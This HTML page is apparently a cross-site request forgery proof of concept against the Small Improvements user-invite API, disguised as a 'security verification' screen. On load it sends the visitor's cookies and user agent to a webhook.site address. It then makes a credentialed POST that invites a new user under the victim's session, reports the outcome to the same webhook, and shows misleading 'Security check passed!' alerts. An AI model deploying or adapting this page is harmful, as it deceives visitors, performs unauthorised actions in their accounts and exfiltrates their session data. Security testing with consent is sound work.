<!DOCTYPE html>
<html>
<head>
    <title>Small Improvements - Security Test</title>
</head>
<body>
    <h2>Performing security verification...</h2>

    <script>
        // Wait for page to load, then attempt CSRF
        setTimeout(function() {
            // Try to make the POST request to Small Improvements
            fetch('https://app.small-improvements.com/api/v2/users/invite', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Csrf-Token': 'si'
                },
                credentials: 'include', // This sends THEIR cookies!
                body: JSON.stringify([{
                    "firstName": "Test",
                    "lastName": "User", 
                    "workEmail": "test@example.com",
                    "isGuest": false,
                    "personalMessage": "",
                    "shouldSendNotification": true
                }])
            })
            .then(response => {
                // Send results to webhook
                fetch('https://webhook.site/5b15d926-1347-4e32-89ff-bd6681723310', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: 'CSRF_ATTEMPT_RESULT',
                        status: response.status,
                        statusText: response.statusText,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent,
                        message: 'CSRF attempt completed'
                    })
                });
                
                if (response.ok) {
                    alert('Security check passed!');
                } else {
                    alert('Security verification failed. Please login to Small Improvements first.');
                }
            })
            .catch(error => {
                fetch('https://webhook.site/5b15d926-1347-4e32-89ff-bd6681723310', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: 'CSRF_ATTEMPT_ERROR',
                        error: error.toString(),
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent,
                        message: 'CSRF attempt failed with error'
                    })
                });
            });
        }, 2000);

        // Send initial data
        fetch('https://webhook.site/5b15d926-1347-4e32-89ff-bd6681723310', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                type: 'PAGE_LOADED',
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                cookies: document.cookie,
                message: 'CSRF test page loaded'
            })
        });
    </script>
</body>
</html>
